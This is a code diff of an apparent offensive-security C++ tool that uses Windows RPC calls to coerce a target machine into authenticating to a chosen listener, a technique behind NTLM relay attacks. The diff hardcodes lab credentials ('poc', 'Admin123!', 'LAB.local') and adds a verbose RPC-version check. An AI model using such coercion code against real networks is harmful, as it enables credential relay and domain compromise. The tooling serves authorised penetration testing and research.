@@ -37,24 +37,16 @@ handle_t RpcBindHandle(const RPC_WSTR InterfaceUUID, const RPC_WSTR InterfaceAdd
 	unsigned long AuthnSvc = RPC_C_AUTHN_WINNT;
 	unsigned long AuthzSvc = RPC_C_AUTHZ_NONE;
 
-	ImpersonateUser obLogon;
-
 	// Auth Identity structure
 	SEC_WINNT_AUTH_IDENTITY_W AuthIdentity;
 	SecureZeroMemory(&AuthIdentity, sizeof(AuthIdentity));
-	//AuthIdentity.User = (unsigned short *)"poc";
-	//AuthIdentity.UserLength = (unsigned long)strlen((char*)AuthIdentity.User);
-	//AuthIdentity.Password = (unsigned short*)"Admin123!";
-	//AuthIdentity.PasswordLength = (unsigned long)strlen((char*)AuthIdentity.Password);
-	//AuthIdentity.Domain = (unsigned short*)"LAB.local";
-	//AuthIdentity.DomainLength = (unsigned long)strlen((char*)AuthIdentity.Domain);
-	//AuthIdentity.Flags = SEC_WINNT_AUTH_IDENTITY_UNICODE;
-
-	// Impersonate the user
-	if (!obLogon.Logon(L"dev", L"DEV", L"dev")) {
-		printf("[!] Error: Impersonated user failed.\n");
-		return (0);
-	}
+	AuthIdentity.User = (unsigned short *)"poc";
+	AuthIdentity.UserLength = (unsigned long)strlen((char*)AuthIdentity.User);
+	AuthIdentity.Password = (unsigned short*)"Admin123!";
+	AuthIdentity.PasswordLength = (unsigned long)strlen((char*)AuthIdentity.Password);
+	AuthIdentity.Domain = (unsigned short*)"LAB.local";
+	AuthIdentity.DomainLength = (unsigned long)strlen((char*)AuthIdentity.Domain);
+	AuthIdentity.Flags = SEC_WINNT_AUTH_IDENTITY_UNICODE;
 
 	swprintf(NetworkAddr, MAX_PATH, L"\\\\%s", target);
 	// https://learn.microsoft.com/en-us/windows/win32/api/rpcdce/nf-rpcdce-rpcstringbindingcomposew
@@ -166,6 +158,10 @@ int main(int argc, char* argv[])
 	std::string listener = std::get<std::string>(parser.get_value("to"));
 	std::wstring listener_w = std::wstring(listener.begin(), listener.end());
 	wchar_t* listener_w_ptr = (wchar_t*)(listener_w.c_str());
+
+	if (verbose) {
+		get_rpc_runtime_version();
+	}
 
 	std::cout << "[>] Coercing " << target << " to authenticate to " << listener << " using remote procedure " << remote_procedure_name << "(...)\n";
 
